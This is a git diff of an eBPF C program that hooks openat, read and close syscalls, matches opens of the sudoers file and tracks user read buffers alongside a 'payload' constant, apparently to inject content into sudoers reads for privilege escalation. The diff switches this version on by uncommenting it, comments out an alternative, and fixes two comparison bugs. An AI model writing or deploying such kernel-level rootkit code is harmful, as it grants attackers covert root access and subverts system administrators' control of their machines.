@@ -1,4 +1,4 @@
-/*#include "vmlinux.h"
+#include "vmlinux.h"
 #include <bpf/bpf_core_read.h>
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_tracing.h>
@@ -39,7 +39,7 @@ const volatile char payload[max_payload_len];
 int openat(int dirfd, const char *pathname, int flags, ...
                   /* mode_t mode  );*/
 
-/*SEC("tp/syscalls/sys_enter_openat")
+SEC("tp/syscalls/sys_enter_openat")
 int handle_openat_enter(struct trace_event_raw_sys_enter *ctx) {
     //print fmt: "dfd: 0x%08lx, filename: 0x%08lx, flags: 0x%08lx, mode: 0x%08lx", 
     //((unsigned long)(REC->dfd)), ((unsigned long)(REC->filename)), ((unsigned long)(REC->flags)), ((unsigned long)(REC->mode))
@@ -73,7 +73,7 @@ int handle_openat_enter(struct trace_event_raw_sys_enter *ctx) {
     char filename[sudoers_len];
     bpf_probe_read_user(&filename, sudoers_len, (char*)ctx->args[1]);
 
-    for(int i = 0; i < payload_len; i++) {
+    for(int i = 0; i < sudoers_len; i++) {
         if(filename[i] != sudoers[i]) {
             return 0;
         }
@@ -144,7 +144,7 @@ int handle_read_exit(struct trace_event_raw_sys_exit *ctx) {
     size_t pid_tgid = bpf_get_current_pid_tgid();
     int pid = pid_tgid >> 32;
     long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
-    if(pbuff_addr <= 0) {
+    if(pbuff_addr == 0) {
         return 0;
     }
     long unsigned int buff_addr = *pbuff_addr;
@@ -204,9 +204,9 @@ int handle_close_exit(struct trace_event_raw_sys_exit *ctx) {
 
     bpf_printk("Close pid %d, maps about pid %d cleaned up\n", pid, pid);    
     return 0;
-}*/
+}
 
-#include "vmlinux.h"
+/*#include "vmlinux.h"
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_tracing.h>
 #include <bpf/bpf_core_read.h>
@@ -419,4 +419,4 @@ int handle_close_exit(struct trace_event_raw_sys_exit *ctx)
     bpf_map_delete_elem(&map_buff_addrs, &pid_tgid);
 
     return 0;
-}
+}*/
